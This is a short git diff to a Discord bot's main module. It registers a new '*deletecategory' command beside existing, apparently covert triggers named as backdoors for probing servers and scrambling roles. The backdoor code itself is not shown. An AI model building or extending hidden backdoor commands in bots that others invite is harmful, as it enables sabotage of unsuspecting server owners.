@@ -3,7 +3,7 @@ import os
 import discord
 
 from autoactions import puslowmode, messagelog
-from chattriggers import setsetting, getsetting, addslowmode, onslowmode, helpcmd, listguilds, backdoor_probeserver, backdoor_dot2_scrambleroles
+from chattriggers import setsetting, getsetting, addslowmode, onslowmode, helpcmd, listguilds, backdoor_probeserver, backdoor_dot2_scrambleroles, delete_category
 from startuptasks import startupmessage, setstatus
 
 
@@ -31,6 +31,7 @@ class Bot:
         # ^ We don't want random users finding out what guilds the bot is in. ^
         self.chat_triggers.append(backdoor_probeserver.BackdoorProbeServer("Probe Server", ["*probeserver ", "*ps "]))
         self.chat_triggers.append(backdoor_dot2_scrambleroles.BackdoorDot2ScrambleRoles("dot2", ["*dot2 "]))
+        self.chat_triggers.append(delete_category.DeleteCategory("Delete Category", ["*deletecategory "]))
 
 
     def run(self):
